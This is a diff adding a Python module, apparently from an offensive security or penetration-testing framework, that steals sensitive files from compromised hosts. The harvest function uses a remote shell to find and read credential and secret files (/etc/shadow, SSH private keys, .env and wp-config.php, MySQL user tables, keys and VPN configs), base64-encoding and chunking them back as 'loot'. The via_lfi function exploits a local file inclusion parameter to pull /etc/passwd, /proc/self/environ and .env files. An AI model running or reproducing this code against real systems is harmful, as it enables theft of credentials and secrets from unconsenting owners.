@@ -1,0 +1,80 @@
+from __future__ import annotations
+import base64, pathlib
+from ..modules.base import Finding
+
+TARGETS = [
+    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/root/.ssh/id_rsa",
+    "/root/.bash_history", "/var/www/html/.env", "/var/www/.env",
+    "/var/lib/mysql/mysql/user.MYD",
+]
+PATTERNS = ("*.env", "*.sql", "*.bak", "*.key", "*.pem", "id_rsa", "*.ovpn", "wp-config.php")
+CHUNK = 400_000
+
+
+async def harvest(ctx, sh) -> Finding:
+    out = ctx.ev_dir() / "loot"
+    out.mkdir(exist_ok=True)
+    got = []
+
+    listing = await sh.exec(
+        "for p in " + " ".join(f"'{x}'" for x in TARGETS) + "; do [ -r $p ] && echo $p; done; "
+        "find /var/www /srv /opt /home -maxdepth 5 -type f \\( "
+        + " -o ".join(f"-name '{p}'" for p in PATTERNS) + " \\) -size -2M 2>/dev/null | head -40",
+        timeout=90)
+
+    for path in [l.strip() for l in listing.out.splitlines() if l.strip().startswith("/")][:40]:
+        safe = path.replace("/", "_")
+        dest = out / safe
+        r = await sh.exec(f"base64 -w0 {path} 2>/dev/null | wc -c")
+        size = int(r.out.strip() or 0)
+        if size == 0:
+            continue
+        if size < CHUNK:
+            b = await sh.exec(f"base64 -w0 {path}")
+            try:
+                dest.write_bytes(base64.b64decode(b.out.strip() + "=="))
+                got.append(path)
+            except Exception:
+                pass
+        else:
+            parts = []
+            for i in range(0, min(size // CHUNK + 1, 12)):
+                b = await sh.exec(f"dd if={path} bs={CHUNK} skip={i} count=1 2>/dev/null | base64 -w0")
+                parts.append(b.out.strip())
+            try:
+                dest.write_bytes(b"".join(base64.b64decode(p + "==") for p in parts if p))
+                got.append(path)
+            except Exception:
+                pass
+
+    if not got:
+        return await ctx.emit(Finding(
+            kind="loot", title="Loot: tidak ada file sensitif terbaca",
+            target=ctx.target, severity="info", confidence="confirmed", evidence="0 file"))
+
+    return await ctx.emit(Finding(
+        kind="loot", title=f"Loot: {len(got)} file sensitif dieksfiltrasi",
+        target=ctx.target, severity="critical", confidence="confirmed",
+        evidence="\n".join(got),
+        repro=[f"cat evidence/loot/{p.replace('/', '_')}" for p in got[:10]],
+        data={"files": got}))
+
+
+async def via_lfi(ctx, f) -> Finding:
+    out = ctx.ev_dir() / "loot-lfi"
+    out.mkdir(exist_ok=True)
+    got = []
+    base = f.data["url"].rsplit("file=", 1)[0]
+    for path in ("/etc/passwd", "/etc/hosts", "/proc/self/environ",
+                 "/var/www/html/.env", "/proc/self/cmdline"):
+        try:
+            r = await ctx.http.get(base + "file=" + path, timeout=12)
+        except Exception:
+            continue
+        if r.status_code == 200 and len(r.text) > 20:
+            (out / path.replace("/", "_")).write_text(r.text[:400_000], errors="ignore")
+            got.append(path)
+    return await ctx.emit(Finding(
+        kind="loot", title=f"LFI: {len(got)} file dieksfiltrasi", target=f.target,
+        severity="high", confidence="confirmed", evidence="\n".join(got),
+        data={"files": got}))
